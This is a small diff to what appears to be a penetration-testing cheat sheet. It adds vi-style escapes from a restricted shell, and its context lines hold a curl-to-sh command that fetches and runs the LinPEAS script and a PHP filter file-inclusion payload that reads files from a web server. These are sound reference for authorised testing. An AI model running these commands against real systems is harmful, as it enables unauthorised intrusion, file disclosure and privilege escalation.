@@ -71,6 +71,13 @@ LinPEAS
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
+Escape  restricted environments
+'''
+:!/bin/sh
+:shell
+:set shell=/bin/sh
+'''
+
 ## Port Scanning
 
 One-liner
@@ -88,3 +95,5 @@ http://[IP]/lx.php?page=php://filter/convert.base64-encode/resource=/var/www/htm
 
 ## Check commands in a restricted shell
 "TAB TAB"
+
+
